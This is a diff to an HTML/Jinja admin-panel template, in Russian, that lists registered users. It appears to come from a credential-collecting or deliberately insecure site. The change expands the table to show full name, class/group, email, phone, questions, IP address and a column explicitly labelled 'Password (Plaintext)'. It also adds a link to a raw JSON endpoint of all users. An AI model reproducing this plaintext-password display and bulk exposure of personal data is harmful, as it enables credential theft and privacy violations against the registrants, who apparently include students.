@@ -7,12 +7,20 @@
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-900 text-gray-100 min-h-screen p-4 md:p-8">
-    <div class="max-w-5xl mx-auto">
+    <div class="max-w-7xl mx-auto">
         <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
             <h1 class="text-3xl font-extrabold text-blue-400 tracking-wide">Панель администратора</h1>
-            <a href="/register" class="bg-gray-750 border border-gray-600 px-4 py-2 rounded-lg hover:bg-gray-700 transition text-sm">
-                ← К регистрации
-            </a>
+            <div class="flex gap-3">
+                <a href="/" class="bg-gray-800 border border-gray-700 px-4 py-2 rounded-lg hover:bg-gray-700 transition text-sm">
+                    ← На главную
+                </a>
+                <a href="/api/users" target="_blank" class="bg-indigo-900/30 border border-indigo-800 text-indigo-400 px-4 py-2 rounded-lg hover:bg-indigo-950 transition text-sm font-semibold">
+                    API (JSON) 📊
+                </a>
+                <a href="/admin/logout" class="bg-red-900/30 border border-red-800 text-red-400 px-4 py-2 rounded-lg hover:bg-red-950 transition text-sm font-semibold">
+                    Выйти 🚪
+                </a>
+            </div>
         </div>
         
         <div class="bg-gray-800 rounded-xl shadow-xl border border-gray-700 overflow-hidden">
@@ -24,8 +32,12 @@
                     <thead>
                         <tr class="bg-gray-700 text-gray-300 text-xs uppercase tracking-wider">
                             <th class="p-4 w-16">ID</th>
-                            <th class="p-4">Логин (Username)</th>
+                            <th class="p-4">ФИО</th>
+                            <th class="p-4">Класс/Группа</th>
+                            <th class="p-4">Email</th>
                             <th class="p-4">Пароль (Plaintext)</th>
+                            <th class="p-4">Телефон</th>
+                            <th class="p-4">Пожелания/Вопросы</th>
                             <th class="p-4">IP-Адрес</th>
                             <th class="p-4">Дата и время</th>
                         </tr>
@@ -35,17 +47,21 @@
                         <tr class="hover:bg-gray-750 transition duration-150">
                             <td class="p-4 text-blue-400 font-mono font-bold">{{ user[0] }}</td>
                             <td class="p-4 font-semibold text-white">{{ user[1] }}</td>
-                            <td class="p-4 text-gray-400 font-mono text-sm">{{ user[2] }}</td>
+                            <td class="p-4 text-gray-400 text-sm">{{ user[2] }}</td>
+                            <td class="p-4 text-green-400 font-mono text-sm">{{ user[3] }}</td>
+                            <td class="p-4 text-gray-400 font-mono text-sm">{{ user[4] }}</td>
+                            <td class="p-4 text-yellow-400 font-mono text-sm">{{ user[5] if user[5] else 'N/A' }}</td>
+                            <td class="p-4 text-purple-400 text-sm max-w-xs overflow-hidden text-ellipsis whitespace-nowrap">{{ user[6] if user[6] else 'N/A' }}</td>
                             <td class="p-4">
                                 <span class="bg-green-900/30 text-green-400 px-2 py-1 rounded font-mono text-xs border border-green-800/50">
-                                    {{ user[3] }}
+                                    {{ user[7] }}
                                 </span>
                             </td>
-                            <td class="p-4 text-xs text-gray-500 font-mono">{{ user[4] }}</td>
+                            <td class="p-4 text-xs text-gray-500 font-mono">{{ user[8] }}</td>
                         </tr>
                         {% else %}
                         <tr>
-                            <td colspan="5" class="p-8 text-center text-gray-500">Пользователей пока нет. Зарегистрируйте кого-нибудь!</td>
+                            <td colspan="9" class="p-8 text-center text-gray-500">Пользователей пока нет. Зарегистрируйте кого-нибудь!</td>
                         </tr>
                         {% endfor %}
                     </tbody>
